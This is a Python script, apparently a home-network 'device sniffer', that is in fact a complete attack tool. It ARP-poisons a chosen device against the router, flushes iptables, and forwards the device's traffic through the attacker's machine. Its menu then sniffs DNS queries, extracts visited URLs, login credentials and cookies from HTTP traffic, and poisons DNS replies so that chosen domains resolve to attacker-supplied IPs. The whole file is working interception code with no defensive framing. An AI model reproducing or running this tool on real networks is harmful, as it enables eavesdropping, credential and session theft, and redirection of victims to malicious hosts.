#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes
import subprocess
import requests
import re
import networkx as nx
import matplotlib.pyplot as plt

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

# Network Mapping
def plot_network_map(devices):
    G = nx.Graph()
    for ip, mac, vendor in devices:
        G.add_node(ip, label=f"{ip}\n({mac})")
    
    for ip1, mac1, vendor1 in devices:
        for ip2, mac2, vendor2 in devices:
            if ip1 != ip2:
                G.add_edge(ip1, ip2)

    pos = nx.spring_layout(G)
    nx.draw(G, pos, with_labels=True, node_size=2000, node_color="skyblue", font_size=10, font_weight="bold")
    labels = nx.get_node_attributes(G, 'label')
    nx.draw_networkx_labels(G, pos, labels, font_size=10)
    plt.title("Network Topology")
    plt.show()

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)
    devices = []
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        devices.append((ip, mac, vendor))
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL}')
    plot_network_map(devices)
    return input('\nPick a device IP: ')

# DNS Spoofing for Multiple Targets
class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_dns(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53', store=0)

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        def arp_pkt_callback(pkt):
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                print(f'{Fore.YELLOW}ARP Sniff: {pkt[ARP].psrc} -> {pkt[ARP].pdst}{Style.RESET_ALL}')
        sniff(iface=self.iface, prn=arp_pkt_callback,
              filter=f'arp and host {self.targetip}', store=0)

    def http_sniff(self):
        def http_pkt_callback(pkt):
            if pkt.haslayer('Raw'):
                raw_data = pkt['Raw'].load.decode(errors='ignore')
                if "POST" in raw_data or "GET" in raw_data:
                    if "Host:" in raw_data and "GET" in raw_data:
                        try:
                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
                            url = f"http://{host}{path}"
                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
                        except Exception:
                            pass

                    if "POST" in raw_data:
                        if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
                           any(k in raw_data.lower() for k in ['password', 'pass', 'pwd']):
                            print(f"{Fore.RED}[!] Possible Credentials Found:{Style.RESET_ALL}")
                            for line in raw_data.split('\r\n'):
                                if '=' in line and len(line) < 100:
                                    print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")

                    if "Set-Cookie:" in raw_data:
                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")

        sniff(iface=self.iface, prn=http_pkt_callback,
              filter=f'tcp port 80 and host {self.targetip}', store=0)

    def enable_ip_forwarding(self):
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')

    def set_iptables(self):
        subprocess.call(f"iptables --flush", shell=True)
        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')

    def dns_poison(self, spoof_ips):
        import netfilterqueue  # Import only when DNS poisoning is needed
        
        def dns_pkt_callback(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                target_ip = pkt[DNS].qd.qname.decode('utf-8').strip('.')
                if target_ip in spoof_ips:
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ips[target_ip]))
                    send(spoofed_pkt, iface=self.iface, verbose=False)
                    print(f'{Fore.RED}DNS Poison: Redirected {pkt[DNS].qd.qname.decode()} to {spoof_ips[target_ip]}{Style.RESET_ALL}')

        nfqueue = netfilterqueue.NetfilterQueue()
        nfqueue.bind(0, dns_pkt_callback)
        print(f'{Fore.GREEN}Listening for DNS packets in NFQUEUE...{Style.RESET_ALL}')
        nfqueue.run()

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff\n2. HTTP Sniff\n3. DNS Poison\n4. ARP Sniff\n5. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.capture_dns()
            elif choice == 2:
                self.http_sniff()
            elif choice == 3:
                spoof_ips = {}
                while True:
                    target = input(f'{Fore.RED}Enter target domain (or "done" to finish): {Style.RESET_ALL}')
                    if target == "done":
                        break
                    ip = input(f'{Fore.RED}Enter spoofed IP for {target}: {Style.RESET_ALL}')
                    spoof_ips[target] = ip
                self.dns_poison(spoof_ips)
            elif choice == 4:
                self.arp_sniff()
            elif choice == 5:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip == "0":
            print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        device.enable_ip_forwarding()
        device.set_iptables()
        try:
            device.sniff()
        except KeyboardInterrupt:
            print(f'\n{Fore.CYAN}Returning to menu...{Style.RESET_ALL}')
            continue
